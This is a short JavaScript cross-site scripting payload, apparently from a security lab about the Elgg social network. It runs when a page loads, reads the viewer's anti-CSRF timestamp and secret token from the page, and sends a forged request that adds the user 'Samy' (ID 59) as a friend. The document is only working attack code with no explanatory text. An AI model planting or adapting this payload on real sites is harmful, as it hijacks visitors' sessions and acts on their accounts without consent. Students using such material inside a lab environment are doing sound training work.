<script type="text/javascript">
window.onload = function () {
  var request=null;

  // Set the timestamp and secret token parameters
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;          
  var token="&__elgg_token="+elgg.security.token.__elgg_token;

  //Construct the HTTP request to add Samy as a friend.
  var sendurl= "http://www.seed-server.com/action/friends/add" 
                + "?friend=59" + token + ts;                 

  //Create and send request request to add friend
  request=new XMLHttpRequest();
  request.open("GET",sendurl,true);
  request.setRequestHeader("Host","www.seed-server.com");
  request.setRequestHeader("Content-Type",
                "application/x-www-form-urlencoded");
  request.send();
}
</script></p>

